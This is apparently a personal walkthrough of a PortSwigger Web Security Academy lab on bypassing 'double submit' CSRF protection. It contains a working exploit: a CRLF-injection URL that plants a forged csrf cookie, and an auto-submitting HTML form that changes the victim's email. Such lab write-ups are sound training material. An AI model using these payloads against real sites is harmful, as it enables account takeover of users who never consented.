https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter



1) login as wiener:peter and change the email using /change-email 
    you can see that csrf in the cookie and the csrf in the body are the same

2) try to use fake csrf in cookie and in body (both "test")
    it works, so the validation is done only on the matching of them

3) craft an html to perform a POST request to /change-email that has same csrf cookie and in the body
4) send it to the victim

5) note that /?search=test%0d%0aSet-Cookie:%20csrf=aaaa%3b%20SameSite=None allows us to set a cookie in the browser











here the check are perfored over the csrf sent using the hidden filed and the csrf cookie we have in the browser

we have noticed that crafting ?search=test%0d%0aSet-Cookie:%20csrf=aaaa%3b%20SameSite=None we are able to rewrite the csrf cookie on the browser


<html>
    <body>
        <form action="https://*****LAB-ID*****.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="exploit@evil-user.net" />
            <!--- here we are using a fake csrf--->
            <input type="hidden" name="csrf" value="fake_csrf" />
        </form>

       <!--- here we are setting the fake csrf in the victim browser and then performing the form submit--->
     <img src="https://*****LAB-ID*****.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake_csrf%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>



Both are equal
